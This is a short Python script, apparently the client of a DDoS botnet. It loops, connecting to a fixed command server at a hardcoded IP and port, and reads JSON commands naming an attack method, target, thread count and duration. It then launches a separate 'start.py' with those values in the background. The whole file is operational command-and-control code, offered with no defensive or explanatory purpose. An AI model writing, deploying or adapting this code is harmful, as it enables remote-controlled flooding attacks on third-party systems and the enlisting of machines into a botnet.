import socket
import json
import subprocess
import time

HOST = '103.157.205.191'  # server cố định
PORT = 6000

while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PORT))
            print(f"[Client] Connected to server {HOST}:{PORT}")

            data = s.recv(4096)
            command = json.loads(data.decode())
            print(f"[Client] Received command: {command}")

            args = [
                "python3", "start.py",
                command["method"],
                command["target"],
                str(command["threads"]),
                str(command["duration"])
            ]
            subprocess.Popen(args)
            print("[Client] start.py launched in background")
    except ConnectionRefusedError:
        print("[Client] Cannot connect to server, retrying in 5s...")
        time.sleep(5)
